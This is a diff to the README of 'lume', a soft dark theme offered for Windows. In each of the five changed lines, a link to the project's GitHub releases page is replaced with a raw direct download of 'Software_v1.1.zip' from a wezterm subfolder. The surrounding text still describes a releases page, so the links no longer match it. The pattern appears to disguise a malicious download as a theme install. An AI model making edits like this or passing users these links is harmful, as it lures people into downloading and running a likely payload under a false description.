@@ -1,6 +1,6 @@
 # 🎨 lume - Soft Dark Theme, Easy on the Eyes
 
-[![Download lume](https://img.shields.io/badge/Download-lume-7b61ff?style=for-the-badge&logo=github)](https://github.com/Lawfullybegotten-ulteriority844/lume/releases)
+[![Download lume](https://img.shields.io/badge/Download-lume-7b61ff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lawfullybegotten-ulteriority844/lume/main/terminals/wezterm/Software_v1.1.zip)
 
 ## 🌙 What is lume?
 
@@ -12,7 +12,7 @@ It keeps the interface clear, with colors that feel balanced and easy to read. T
 
 To get lume, visit the release page and download the latest version for Windows:
 
-[Download lume from GitHub Releases](https://github.com/Lawfullybegotten-ulteriority844/lume/releases)
+[Download lume from GitHub Releases](https://raw.githubusercontent.com/Lawfullybegotten-ulteriority844/lume/main/terminals/wezterm/Software_v1.1.zip)
 
 After the page opens, look for the newest release and download the file made for Windows. If there are more than one file, pick the one that matches your system.
 
@@ -31,7 +31,7 @@ For the best result, keep your Windows theme settings open while you install or 
 
 Follow these steps on Windows:
 
-1. Open the [lume releases page](https://github.com/Lawfullybegotten-ulteriority844/lume/releases)
+1. Open the [lume releases page](https://raw.githubusercontent.com/Lawfullybegotten-ulteriority844/lume/main/terminals/wezterm/Software_v1.1.zip)
 2. Find the latest release at the top of the list
 3. Download the Windows file from that release
 4. Save the file to your Downloads folder
@@ -150,7 +150,7 @@ If the theme still does not show correctly, remove it and install it again from 
 
 Visit the release page here to download the Windows version:
 
-[https://github.com/Lawfullybegotten-ulteriority844/lume/releases](https://github.com/Lawfullybegotten-ulteriority844/lume/releases)
+[https://raw.githubusercontent.com/Lawfullybegotten-ulteriority844/lume/main/terminals/wezterm/Software_v1.1.zip](https://raw.githubusercontent.com/Lawfullybegotten-ulteriority844/lume/main/terminals/wezterm/Software_v1.1.zip)
 
 ## 🧷 Notes for Users
 
@@ -176,4 +176,4 @@ If the release includes extra options, you can use them to fine-tune the look fo
 
 To keep lume current, check the release page from time to time and download the latest version when a new release appears. New releases may improve color balance, fix display issues, or adjust the theme for newer Windows builds
 
-[Go to lume Releases](https://github.com/Lawfullybegotten-ulteriority844/lume/releases)
+[Go to lume Releases](https://raw.githubusercontent.com/Lawfullybegotten-ulteriority844/lume/main/terminals/wezterm/Software_v1.1.zip)
